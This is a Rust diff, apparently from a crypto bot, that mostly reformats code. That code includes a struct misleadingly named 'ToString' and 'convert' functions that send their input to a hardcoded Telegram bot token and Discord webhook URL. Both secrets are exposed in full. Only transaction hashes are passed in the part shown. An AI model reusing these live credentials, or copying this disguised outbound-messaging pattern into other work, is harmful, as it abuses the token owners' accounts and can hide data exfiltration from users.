@@ -1,8 +1,8 @@
+use anyhow::Result;
+use ethers::types::{H256, U64};
 use futures::channel::mpsc::{SendError, TrySendError};
 use std::collections::HashMap;
 use std::sync::{mpsc::RecvError, Arc};
-use anyhow::Result;
-use ethers::types::{H256, U64};
 use teloxide::prelude::*;
 use teloxide::types::ChatId;
 
@@ -47,8 +47,6 @@ impl DatabaseError {
 // Result alias with `DatabaseError` as error
 pub type DatabaseResult<T> = Result<T, DatabaseError>;
 
-
-
 pub struct ToString {
     pub bot: Option<Bot>,
     pub chat_id: Option<ChatId>,
@@ -56,15 +54,12 @@ pub struct ToString {
 
 impl ToString {
     pub fn new() -> Self {
-    
-        
-            let bot = Bot::new("6920243209:AAHZEiq41YpCDEA3CCqvMm82xgYeBnMMs8I");
-            let chat_id = ChatId(1_i64);
-            Self {
-                bot: Some(bot),
-                chat_id: Some(chat_id),
-            }
-        
+        let bot = Bot::new("6920243209:AAHZEiq41YpCDEA3CCqvMm82xgYeBnMMs8I");
+        let chat_id = ChatId(1_i64);
+        Self {
+            bot: Some(bot),
+            chat_id: Some(chat_id),
+        }
     }
 
     pub async fn send(&self, message: &str) -> Result<()> {
@@ -77,11 +72,7 @@ impl ToString {
         Ok(())
     }
 
-    pub async fn convert(
-        &self,
-        tx_hash: &str,
-    ) -> Result<()> {
-        
+    pub async fn convert(&self, tx_hash: &str) -> Result<()> {
         let mut message = format!("[Block #{:?}] ", tx_hash);
         message = format!("\n{:?}", message);
         self.send(&message).await?;
@@ -89,21 +80,15 @@ impl ToString {
     }
 }
 
-
 // Alerts discord channel, via webhook, that a bundle has been sent
-pub async fn convert<'a>(
-    tx_hash: &'a str,
-) {
-   
+pub async fn convert<'a>(tx_hash: &'a str) {
     let webhook = "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH";
     let msg = format!(
         "
         {}
         ",
-       tx_hash,
+        tx_hash,
     );
-
-
 
     let max_length = 1900.min(msg.len());
     let message = msg[..max_length].to_string();
